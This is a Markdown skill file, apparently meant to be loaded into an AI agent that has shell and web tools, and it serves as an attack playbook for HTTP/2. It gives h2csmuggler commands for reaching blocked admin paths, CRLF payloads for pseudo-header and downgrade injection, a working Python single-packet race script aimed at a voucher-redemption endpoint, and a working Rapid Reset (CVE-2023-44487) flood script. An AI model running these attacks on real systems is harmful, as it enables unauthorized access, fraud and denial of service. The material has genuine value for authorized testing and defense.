---
name: http2-specific-attacks
description: HTTP/2 specific attack techniques — h2c smuggling (h2csmuggler), pseudo-header injection (:method/:path/:authority), HPACK header compression attacks, single-packet race condition via multiplexing, RST_STREAM flood (CVE-2023-44487 HTTP/2 Rapid Reset), and H2→H1 downgrade injection.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP/2 introduces unique attack surfaces beyond HTTP/1.1 request smuggling. Covers h2c cleartext smuggling to bypass proxy ACLs, pseudo-header injection, HPACK compression side-channels, single-packet race conditions via stream multiplexing, and the Rapid Reset DoS CVE. Base models often conflate H2 smuggling with H1 smuggling or miss the h2csmuggler tool entirely.

## 0. RELATED ROUTING

- request-smuggling — HTTP/1.1 CL.TE / TE.CL smuggling
- race-condition — single-packet H2 race is a specialized race condition technique
- 401-403-bypass-techniques — h2c smuggling to bypass proxy-level ACLs

---

## 1. H2C SMUGGLING (HTTP/2 CLEARTEXT UPGRADE)

### Concept

When a reverse proxy (Nginx, HAProxy, AWS ALB) forwards HTTP/1.1 requests to a backend that supports `h2c` (HTTP/2 over cleartext), the proxy's access controls only apply to the outer HTTP/1.1 request. The inner HTTP/2 stream can reach internal paths that the proxy would normally block.

### How It Works

```
Client → HTTP/1.1 Upgrade: h2c → Proxy → HTTP/2 stream → Backend
         [Proxy forwards upgrade]        [Backend routes HTTP/2 stream]
         [Proxy only sees: GET /]        [Backend executes: GET /admin]
```

The proxy forwards the connection upgrade without checking the inner H2 stream destinations.

### h2csmuggler Tool

```bash
# Install:
pip3 install h2csmuggler
# or: git clone https://github.com/assetnote/h2csmuggler

# Check if target supports h2c upgrade:
h2csmuggler check https://target.com

# Access restricted path via h2c smuggling:
h2csmuggler --wordlist /dev/null -x https://target.com/admin
h2csmuggler -d "data=value" -X POST -H "Content-Type: application/json" \
            -x https://target.com/admin-api/users

# Scan for accessible paths:
h2csmuggler --wordlist paths.txt -x https://target.com
```

### Manual h2c Upgrade Request

```http
GET / HTTP/1.1
Host: target.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__

```

If the backend responds with `101 Switching Protocols`, h2c is supported and smuggling is possible.

---

## 2. HTTP/2 PSEUDO-HEADER INJECTION

HTTP/2 uses pseudo-headers instead of the HTTP/1.1 request line:
- `:method` — HTTP method (GET, POST, etc.)
- `:path` — URL path
- `:scheme` — http/https
- `:authority` — Host header equivalent

### Pseudo-Header Injection Attacks

**Injecting newlines into pseudo-headers** (H2→H1 downgrade poisoning):

```
:method: GET
:path: /path\r\nX-Injected: header\r\n\r\n
:authority: target.com
```

If the H2→H1 layer doesn't sanitize pseudo-headers before rewriting to HTTP/1.1, the newlines create a secondary request or poison headers.

**Method injection:**
```
:method: GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\nGET
```

**Path injection for cache poisoning:**
```
:path: /path?param=value#fragment
# Fragment may be passed to backend unexpectedly
```

### H2→H1 Downgrade Header Injection

When proxy downgrades H2 to H1:
```
# Inject H1-style headers via H2 header with same name as H1 special header:
:method: GET
:path: /
:authority: target.com
Transfer-Encoding: chunked  # Ambiguous — creates CL/TE confusion downstream

# Or inject via pseudo-header:
:path: /?param=%0d%0aX-Forwarded-For: 127.0.0.1
```

---

## 3. HPACK HEADER COMPRESSION ATTACKS

HPACK compresses HTTP/2 headers using a static table and dynamic table. Side-channel attacks observe response size/timing to infer secret header values.

### BREACH-like Attack on H2

If a secret is reflected in compressed HTTP/2 response headers:

```python
# Attack: inject user-controlled string alongside secret in compressed header
# If injected prefix matches secret prefix → better compression → smaller response

import requests

secret_len = 0
for length in range(1, 100):
    r = requests.get(f'https://target.com/?inject={"A" * length}')
    # Measure compressed response header size
    # If size decreases at some point → compression oracle
```

### CRIME Attack (Legacy)

CRIME exploited TLS compression of HTTP headers:
- Inject guesses into compressed TLS stream
- Observe response size change
- Cookie characters that match are compressed away → smaller response

**Mitigated**: TLS 1.3 and all modern browsers disable TLS compression. Relevant for legacy/custom implementations.

---

## 4. SINGLE-PACKET RACE CONDITION VIA H2 MULTIPLEXING

HTTP/2 multiplexing allows multiple concurrent streams in a single TCP connection. By sending multiple requests in one TCP packet, all arrive at the server simultaneously, enabling race conditions with zero network jitter.

### Concept

```
Stream 1: POST /redeem-voucher ─┐
Stream 2: POST /redeem-voucher ─┼── All in one TCP packet ──→ Server receives all simultaneously
Stream 3: POST /redeem-voucher ─┘
```

This eliminates the network timing variance that makes HTTP/1.1 race conditions difficult, achieving true simultaneous arrival.

### Burp Suite Single-Packet Attack

```
1. Send request to Repeater
2. Duplicate request 20 times (Ctrl+R)
3. Group all into a tab group
4. Send group with "Send group in parallel (single-packet attack)"
5. All requests arrive in single TCP packet → true race condition
```

### Python Implementation (using h2 library)

```python
from h2.connection import H2Connection
from h2.config import H2Configuration
import socket, ssl

# Connect with TLS
sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ssl_sock = ctx.wrap_socket(sock, server_hostname='target.com')

# Create H2 connection
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
ssl_sock.send(conn.data_to_send())

# Queue multiple requests in one send
for i in range(20):
    headers = [
        (':method', 'POST'),
        (':path', '/redeem-voucher'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
    ]
    body = b'{"voucher_code": "DISCOUNT50"}'
    conn.send_headers(stream_id=i*2+1, headers=headers)
    conn.send_data(stream_id=i*2+1, data=body, end_stream=True)

# Send all in one burst
ssl_sock.send(conn.data_to_send())
```

---

## 5. RST_STREAM FLOOD (CVE-2023-44487 — HTTP/2 RAPID RESET)

### Vulnerability

Attackers send multiple HEADERS frames immediately followed by RST_STREAM frames. This creates work for the server (processing the initial request) but the RST cancels before the server sends a response. 

By flooding thousands of such reset-cancel cycles:
- Server expends significant CPU on request processing
- Attacker uses minimal bandwidth
- Traditional rate limiting (which tracks active streams) is bypassed because streams are immediately cancelled

### Impact

- CVSS 7.5 — Denial of Service
- Exploited in record-breaking DDoS attacks (>398 million requests/second, August 2023)
- Affected: Nginx, Apache httpd, AWS ALB, Google Cloud, Cloudflare

### Detection / Testing (authorized only)

```python
import h2.connection, h2.config, ssl, socket

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ssl_sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssl_sock.send(conn.data_to_send())

for i in range(100):
    stream_id = i * 2 + 1
    headers = [(':method','GET'),(':path','/'),(':authority','target.com'),(':scheme','https')]
    conn.send_headers(stream_id=stream_id, headers=headers, end_stream=True)
    conn.reset_stream(stream_id=stream_id)  # Immediate RST
    
ssl_sock.send(conn.data_to_send())
```

**Note**: This is a DoS technique. Use only on authorized targets in controlled testing.

---

## 6. HTTP/2 TO HTTP/1.1 DOWNGRADE INJECTION

Proxies that accept H2 from clients but speak H1 to backends create translation points where injection may occur.

### Transfer-Encoding Injection via H2 Headers

H2 is length-delimited (no Transfer-Encoding needed). But if the proxy forwards `Transfer-Encoding: chunked` header to the H1 backend:

```
H2 request with header: transfer-encoding: chunked
↓ Proxy downgrades to H1
↓ Forwards: Transfer-Encoding: chunked
→ Backend processes chunked body → potential H1 smuggling
```

### Content-Length Confusion

```
H2 request:
:method: POST
:path: /
content-length: 0
(actual body: 100 bytes)

→ Proxy might forward CL:0 to H1 backend while body still arrives → desync
```

---

## 7. TESTING CHECKLIST

```
□ Check if target supports h2c upgrade (101 response to Upgrade: h2c)
□ Run h2csmuggler to enumerate accessible paths via h2c
□ Probe pseudo-headers for injection (newlines, special characters)
□ Check if proxy performs H2→H1 downgrade and passes through H2-specific headers
□ Identify race-condition-vulnerable endpoints → test with single-packet attack via Burp
□ Check server version for CVE-2023-44487 (Rapid Reset) — Nginx < 1.25.3, etc.
□ Test HPACK side-channel if secret data is reflected in compressed H2 headers
□ Check server's concurrent stream limit (settings frame SETTINGS_MAX_CONCURRENT_STREAMS)
```

---

## 8. TOOLS SUMMARY

| Tool | Purpose |
|---|---|
| h2csmuggler | H2C upgrade detection and path smuggling |
| Burp Suite Professional | H2 single-packet race, H2 smuggling (Pro required for H2) |
| nghttp2 / h2c | Manual HTTP/2 client |
| `python -m h2` | H2 library for custom attacks |
| Wireshark with h2 dissector | Protocol-level debugging |
| nuclei | CVE-2023-44487 detection templates |
